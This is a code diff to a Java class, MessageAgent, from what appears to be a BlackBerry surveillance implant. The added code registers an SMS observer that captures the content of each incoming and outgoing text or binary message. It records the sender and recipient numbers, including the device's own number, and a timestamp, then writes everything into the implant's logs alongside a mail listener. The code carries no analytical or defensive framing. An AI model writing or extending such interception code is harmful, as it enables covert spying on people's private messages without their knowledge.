@@ -9,9 +9,16 @@
  * *************************************************/
 package blackberry.agent;
 
+import java.io.UnsupportedEncodingException;
 import java.util.Date;
 import java.util.Vector;
 
+import javax.wireless.messaging.BinaryMessage;
+import javax.wireless.messaging.Message;
+import javax.wireless.messaging.TextMessage;
+
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.AgentManager;
 import blackberry.Status;
@@ -22,10 +29,13 @@ import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.interfaces.SmsObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.log.TimestampMarkup;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
+import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
@@ -54,11 +64,13 @@ import blackberry.utils.WChar;
 /**
  * The Class MessageAgent.
  */
-public final class MessageAgent extends Agent {
+public final class MessageAgent extends Agent implements SmsObserver {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
     //#endif
+
+    private static final int SMS_VERSION = 2010050501;
 
     protected static final int SLEEPTIME = 5000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
@@ -93,7 +105,7 @@ public final class MessageAgent extends Agent {
 
         mailListener = new MailListener(this);
         smsListener = SmsListener.getInstance();
-        smsListener.setMessageAgent(this);
+        //smsListener.setMessageAgent(this);
     }
 
     /**
@@ -165,7 +177,8 @@ public final class MessageAgent extends Agent {
      */
     public void actualStart() {
         firstRun = true;
-        smsListener.start();
+        //TODO: se gli sms sono disabilitati non far partire il listener.
+        smsListener.addSmsObserver(this);
         mailListener.start();
     }
 
@@ -174,7 +187,7 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     public void actualStop() {
-        smsListener.stop();
+        smsListener.removeSmsObserver(this);
         mailListener.stop();
     }
 
@@ -390,5 +403,176 @@ public final class MessageAgent extends Agent {
 
         //lastcheck = new Date(0); 
     }
+    
+
+    public void onNewSms(
+            final javax.wireless.messaging.Message message,
+            final boolean incoming) {
+        //#ifdef DBC
+        Check.requires(message != null, "saveLog: null message");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("saveLog: " + message);
+        //#endif
+
+        final byte[] dataMsg = getDataMessage(message);
+        //#ifdef DBC
+        Check.asserts(dataMsg != null, "saveLog: null dataMsg");
+        //#endif
+
+        //final ByteArrayOutputStream os = null;
+        try {
+
+            final int flags = incoming ? 1 : 0;
+
+            DateTime filetime = null;
+            final int additionalDataLen = 48;
+            final byte[] additionalData = new byte[additionalDataLen];
+
+            String from;
+            String to;
+            String address = message.getAddress();
+
+            // Check if it's actually a sms
+
+            final String prefix = "sms://";
+            if (address.indexOf(prefix) == 0) {
+                address = address.substring(prefix.length());
+            } else {
+                //#ifdef DEBUG
+                debug.error("Not a sms");
+                //#endif
+                return;
+            }
+
+            if (address.indexOf(":") > 0) {
+                //#ifdef DEBUG
+                debug.warn("Probably a MMS");
+                //#endif
+                return;
+            }
+
+            // Filling fields
+
+            final Date date = new Date();
+
+            if (incoming) {
+                from = address;
+                to = getMyAddress();
+
+            } else {
+                from = getMyAddress();
+                to = address;
+            }
+
+            filetime = new DateTime(date);
+
+            //#ifdef DBC
+            Check.asserts(filetime != null, "saveLog: null filetime");
+            //#endif
+
+            // preparing additionalData
+
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
+                    additionalDataLen, false);
+            databuffer.writeInt(SMS_VERSION);
+            databuffer.writeInt(flags);
+            databuffer.writeLong(filetime.getFiledate());
+            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
+            databuffer.write(Utils.padByteArray(to.getBytes(), 16));
+
+            //#ifdef DEBUG
+            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
+            debug.info("From: " + from + " To: " + to + " date: "
+                    + filetime.toString());
+            //#endif
+
+            //#ifdef DBC
+            Check.ensures(databuffer.getLength() == additionalDataLen,
+                    "SMS Wrong databuffer size: " + databuffer.getLength());
+            Check.ensures(additionalData.length == additionalDataLen,
+                    "SMS Wrong buffer size: " + additionalData.length);
+            //#endif
+
+            // Creating log
+            if (dataMsg != null) {
+                createLog(additionalData, dataMsg, LogType.SMS_NEW);
+                return;
+            } else {
+                //#ifdef DEBUG
+                debug.error("data null");
+                //#endif
+
+                return;
+            }
+
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
+            debug.error("saveLog message: " + ex);
+            //#endif
+            return;
+        }
+    }
+
+    /**
+     * @param message
+     * @param dataMsg
+     * @return
+     */
+    private byte[] getDataMessage(final javax.wireless.messaging.Message message) {
+
+        byte[] dataMsg = null;
+
+        if (message instanceof TextMessage) {
+            final TextMessage tm = (TextMessage) message;
+            final String msg = tm.getPayloadText();
+            //#ifdef DEBUG
+            debug.info("Got Text SMS: " + msg);
+            //#endif
+
+            dataMsg = WChar.getBytes(msg);
+
+        } else if (message instanceof BinaryMessage) {
+            dataMsg = ((BinaryMessage) message).getPayloadData();
+
+            try {
+
+                //String msg16 = new String(data, "UTF-16BE");
+                final String msg8 = new String(dataMsg, "UTF-8");
+
+                //#ifdef DEBUG
+                //debug.trace("saveLog msg16:" + msg16);
+                debug.trace("saveLog msg8:" + msg8);
+                //#endif
+
+            } catch (final UnsupportedEncodingException e) {
+                //#ifdef DEBUG
+                debug.error("saveLog:" + e);
+                //#endif
+            }
+            //#ifdef DEBUG
+            debug.info("Got Binary SMS, len: " + dataMsg.length);
+            //#endif
+        }
+        return dataMsg;
+    }
+
+    private String getMyAddress() {
+        final String number = Phone.getDevicePhoneNumber(false);
+        if (number == null || number.startsWith("Unknown")) {
+            return "local";
+        }
+
+        //#ifdef DBC
+        Check
+                .ensures(number.length() <= 16, "getMyAddress too long: "
+                        + number);
+        //#endif
+
+        return number;
+    }
+
+
 
 }
